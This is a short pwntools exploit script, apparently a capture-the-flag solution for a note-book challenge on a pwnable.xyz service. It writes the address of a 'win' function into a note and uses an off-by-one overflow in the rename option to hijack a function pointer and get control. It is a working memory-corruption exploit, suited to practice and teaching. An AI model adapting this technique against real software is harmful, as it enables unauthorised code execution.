from pwn import *

context.log_level = 'debug'
e = ELF('./challenge')
# p = process('./challenge')
p = remote('svc.pwnable.xyz',30035)
libc = e.libc
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)
win = e.symbols['win']
nbook = 0x0000000000602280
ptr = 0x0000000000602300

def make(size,title,note):
	sla('>','1')
	sla(':',str(size))
	sla(':',title)
	sla(':',note)

def edit(note):
	sla('>','2')
	sa(':',note)

def delete():
	sla('>','3')

def rename(name):
	sla('>','4')
	sa(':',name)

sla(':','A'*4)
make(32,p32(win)+'\x00'*4,'B')
rename('A'*127+'\x1c') # off-by-one
sla('>','2') # function ptr -> execute

p.interactive()